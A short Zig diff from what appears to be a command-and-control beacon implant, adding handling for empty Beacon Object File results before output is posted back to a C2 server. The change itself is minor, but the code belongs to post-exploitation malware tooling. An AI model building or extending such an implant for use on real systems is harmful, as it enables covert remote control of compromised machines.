@@ -735,6 +735,12 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *zbeac0n.State) !void
             context.release();
         }
 
+        if (bof_res.len <= 0) {
+            const ts = try allocator.dupeZ(u8, "");
+            bof_res.output = ts.ptr;
+            bof_res.len = 0;
+        }
+
         //
         // Sending results (status code & output) to C2 server (POST_RESULT)
         //
